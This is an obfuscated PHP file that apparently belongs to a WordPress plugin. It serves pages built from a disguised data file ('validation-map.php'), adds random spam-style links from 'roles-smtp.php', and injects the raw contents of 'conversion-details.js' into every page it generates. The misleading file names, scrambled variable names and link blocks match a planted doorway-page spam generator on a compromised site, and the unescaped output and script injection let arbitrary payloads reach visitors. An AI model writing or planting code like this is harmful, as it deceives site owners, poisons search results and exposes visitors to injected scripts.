<?php
$fo645 = intval(get_query_var('jbefon'));

if ($fo645 < 1 || $fo645 > 2517) return;
$vbaV7qX9 = file(plugin_dir_path(__FILE__).'validation-map.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$vZ79r = explode(';', $vbaV7qX9[$fo645]);
if (count($vZ79r) < 2) return;
$kDQuY = $vZ79r[0];
$cgFJCBQ  = $vZ79r[1];
$qzKXPDZn = $vZ79r[2];
$okAYspUwNb  = $vZ79r[3];
$aP6J7fwvWL = $vZ79r[4];
set_query_var('jthywgogq', $kDQuY);

$re6BvFZgmM = '';
$xA5bI = plugin_dir_path(__FILE__).'roles-smtp.php';
if (is_file($xA5bI)) {
	$fEvld = file($xA5bI, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($fEvld);
	shuffle($fEvld);
	$njCDK5a3i = mt_rand(2, 5);
	if (count($fEvld) > $njCDK5a3i) {
		for ($g41kPc = 0; $g41kPc < $njCDK5a3i; $g41kPc++) {
			$dLuTl = array_shift($fEvld);
			$re6BvFZgmM .= '<p><a href="'.$dLuTl.'">'.$dLuTl.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $kDQuY; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $cgFJCBQ . "</p>\n";
				if (strlen($okAYspUwNb) > 0) echo "<p>" . $okAYspUwNb . "</p>\n";
				if (strlen($qzKXPDZn) > 0) echo "<p>" . $qzKXPDZn . "</p>\n";
				if (strlen($aP6J7fwvWL) > 0) echo '<p><a href="#"><img src="'.$aP6J7fwvWL.'"></a>' . "</p>\n";
				echo $re6BvFZgmM;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$byh4j = plugin_dir_path(__FILE__) . 'conversion-details.js';
if (is_file($byh4j)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($byh4j);
	echo '</script>';
}
get_footer();
?>
